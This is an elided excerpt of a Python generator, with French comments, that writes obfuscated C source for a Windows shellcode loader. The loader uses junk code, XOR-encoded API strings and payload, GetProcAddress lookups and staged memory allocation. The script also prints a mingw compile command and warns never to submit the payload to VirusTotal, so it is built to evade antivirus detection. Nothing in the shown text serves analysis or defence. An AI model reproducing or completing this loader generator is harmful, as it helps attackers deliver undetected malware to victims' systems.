...
{junk1}
    ...
    unsigned char enc_k32[] = {{ {', '.join(f'0x{b:02x}' for b in encoded_k32)} }};
...
{junk2}
    ...
    Type_{var_func1} {var_func1} = (Type_{var_func1})GetProcAddress({var_kernel}, str_va);
    Type_{var_func2} {var_func2} = (Type_{var_func2})GetProcAddress({var_kernel}, str_vp);
    ...
    for(int {var_idx} = 0; {var_idx} < {var_size}; {var_idx}++) {{
        {var_decoded}[{var_idx}] = {var_encoded}[{var_idx}] ^ {var_key}[{var_idx} % sizeof({var_key})];
    }}
    
    // Allocation mémoire (d'abord non-exécutable)
    LPVOID {var_addr} = {var_func1}(0, {var_size}, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
...
def main():
    ...
    print(f"\n[*] Compilation:")
    print(f"    i686-w64-mingw32-gcc {output_c} -o obfuscated.exe -s -O2")
    ...
    print(f"[!] Ne partagez JAMAIS votre payload sur VirusTotal!")
